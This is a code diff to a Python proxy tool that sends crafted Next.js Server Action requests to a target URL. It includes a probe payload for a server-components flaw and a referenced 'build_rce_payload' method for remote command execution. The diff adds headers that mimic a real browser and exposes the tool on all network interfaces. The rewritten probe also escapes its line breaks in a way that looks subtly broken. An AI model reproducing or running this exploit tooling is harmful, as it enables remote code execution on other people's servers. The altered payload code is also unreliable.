@@ -54,8 +54,14 @@ class ProxyHandler(BaseHTTPRequestHandler):
             
             headers = {
                 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+                'Accept': 'text/x-component',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
                 'Next-Action': 'x',
+                'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                 'Content-Type': f'multipart/form-data; boundary={boundary}',
+                'Origin': target_url.rstrip('/'),
+                'Referer': target_url,
                 'X-Nextjs-Request-Id': request_id,
             }
             
@@ -92,16 +98,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
             self.wfile.write(json.dumps({'error': str(e)}).encode())
 
     def build_safe_payload(self, boundary):
-        
-        payload = f"""--{boundary}\r
-Content-Disposition: form-data; name="1"\r
-\r
-{{}}\r
---{boundary}\r
-Content-Disposition: form-data; name="0"\r
-\r
-["$1:aa:aa"]\r
---{boundary}--"""
+        payload = f'--{boundary}\\r\\nContent-Disposition: form-data; name="1"\\r\\n\\r\\n{{}}\\r\\n--{boundary}\\r\\nContent-Disposition: form-data; name="0"\\r\\n\\r\\n["$1:aa:aa"]\\r\\n--{boundary}--'
         return payload.encode('utf-8')
 
     def build_rce_payload(self, command, boundary):
@@ -160,7 +157,7 @@ def main():
 """)
     
     try:
-        server = HTTPServer(('localhost', PORT), ProxyHandler)
+        server = HTTPServer(('0.0.0.0', PORT), ProxyHandler)
         print(f"✓ Server running on http://localhost:{PORT}")
         print(f"Port: {PORT}")
         print(f"✓ Ready to accept connections\n")
